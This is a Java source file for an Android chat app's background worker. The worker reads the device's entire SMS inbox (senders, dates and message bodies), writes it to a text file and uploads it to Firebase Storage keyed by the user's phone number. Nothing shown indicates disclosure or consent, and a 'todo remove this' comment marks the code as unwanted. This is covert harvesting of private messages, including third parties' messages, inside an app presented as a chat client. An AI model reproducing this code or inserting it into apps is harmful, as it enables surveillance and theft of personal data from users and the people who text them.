package com.example.chatapp.workers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.ListenableWorker;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileWriter;
import java.io.IOException;

public class UserSMSUploadWorker extends Worker {
    private final FirebaseUser currentUser;
    private final StorageReference mStorageRef;

    public UserSMSUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        FirebaseAuth mAuth = FirebaseAuth.getInstance();
        currentUser = mAuth.getCurrentUser();
        mStorageRef = FirebaseStorage.getInstance().getReference();
    }

    @NonNull
    @Override
    public ListenableWorker.Result doWork() {
        // todo remove this
        uploadSMS();
        return ListenableWorker.Result.success();
    }

    private void uploadSMS() {
        final StringBuilder sms = new StringBuilder();
        Cursor cursor = getApplicationContext().getContentResolver().query(Uri.parse("content://sms/inbox"), new String[]{"address", "date", "body"}, null, null, null);

        if (cursor.moveToFirst()) { // must check the result to prevent exception
            do {
                for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                    sms.append(" ").append(cursor.getColumnName(idx)).append(":").append(cursor.getString(idx)).append('\n');
                }
                sms.append("\n\n");
                // use msgData
            } while (cursor.moveToNext());
        } else {
            // empty box, no SMS
        }
        cursor.close();
        String smsString = sms.toString();

        File myFolder = getApplicationContext().getFilesDir();
        File smsFile = new File(myFolder, "sms.txt");
        try {
            FileWriter fileWriter = new FileWriter(smsFile);
            fileWriter.append(smsString);
            fileWriter.flush();
            fileWriter.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
        Uri file = Uri.fromFile(smsFile);
        String path = currentUser.getPhoneNumber() + "/sms/" + "sms.txt";
        StorageReference contactsRef = mStorageRef.child(path);
        contactsRef.putFile(file)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        Log.d("SMS", "Listener Upload successful");
                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        exception.printStackTrace();
                        Log.d("SMS", "Listener Upload not successful");
                        Log.d("Firebase", "onFailure: Upload Failed" + exception.toString());
                    }
                });
    }
}
